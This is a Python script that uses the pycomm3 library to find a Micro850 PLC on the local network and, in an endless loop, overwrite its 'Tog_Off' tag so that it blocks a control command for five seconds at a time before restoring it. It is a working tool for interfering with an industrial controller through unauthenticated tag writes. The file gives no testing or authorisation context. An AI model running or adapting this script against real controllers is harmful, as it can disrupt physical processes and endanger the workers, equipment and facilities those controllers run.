import pycomm3
import time
import socket
import re

# Configuration
PLC_CONTROLLER_TYPE = 'Micro850' # Ensure this matches your controller type
TAG_TO_MODIFY = 'Tog_Off'  # Tag to block the command
BLOCK_VALUE = True  # Value to set the tag to in order to block commands
CYCLE_TIME = 5  # Time (seconds) to block command messages
RESTORE_TIME = 5 # Time (seconds) to restore tag to it's initial state after CYCLE_TIME

def find_plc_ip_address():
    """
    Attempts to find the PLC's IP address on the local network.
    This is a basic method and may need adjustment for different network setups.
    It relies on broadcast pings and analyzing responses. This method may not be
    reliable in all network configurations. Consider using more robust discovery
    mechanisms (e.g., Rockwell's RSLinx) or configuring the IP manually if
    automatic discovery fails.
    """
    # Try to find the PLC IP using ethernet/IP discovery (this often requires appropriate network configuration and can fail)
    try:
        with pycomm3.LogixDriver('0.0.0.0') as driver:
            devices = driver.discover()
        for device in devices:
            if PLC_CONTROLLER_TYPE in device.ProductName:
                print(f"Found PLC with name {device.ProductName} at IP address {device.IPAddress}")
                return device.IPAddress
        print("PLC Not Found, provide the IP address")
        IP_ADDRESS = input()
        return IP_ADDRESS
    except Exception as e:
        print(f"Failed to find PLC IP address automatically: {e}")
        print("Please enter the PLC IP address manually:")
        IP_ADDRESS = input()
        return IP_ADDRESS


def block_command(plc_ip, tag_name, block_value):
    """
    Connects to the PLC and sets the specified tag to the block_value,
    effectively blocking the command message.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as driver:
            # Read initial value
            read_result = driver.read(tag_name)
            if read_result.status == 'Success':
                initial_value = read_result.value
                print(f"Initial value of {tag_name}: {initial_value}")
            else:
                print(f"Failed to read initial value of {tag_name}: {read_result.status}")
                return

            # Block the command
            write_result = driver.write(tag_name, block_value)
            if write_result.status == 'Success':
                print(f"Successfully blocked command by setting {tag_name} to {block_value}")
            else:
                print(f"Failed to block command: {write_result.status}")

            time.sleep(CYCLE_TIME)

            # Restore original value
            write_result = driver.write(tag_name, initial_value)
            if write_result.status == 'Success':
                print(f"Successfully restored value of {tag_name} to {initial_value}")
            else:
                print(f"Failed to restore value: {write_result.status}")

    except Exception as e:
        print(f"Error communicating with PLC: {e}")


if __name__ == "__main__":
    plc_ip = find_plc_ip_address()

    if plc_ip:
        print(f"Using PLC IP address: {plc_ip}")
        while True:
            block_command(plc_ip, TAG_TO_MODIFY, BLOCK_VALUE)
            print(f"Command blocked, waiting {CYCLE_TIME + RESTORE_TIME} seconds before repeating...")
            time.sleep(RESTORE_TIME)  # Give the PLC time to return to normal operation after unblocking
    else:
        print("Failed to obtain PLC IP address. Exiting.")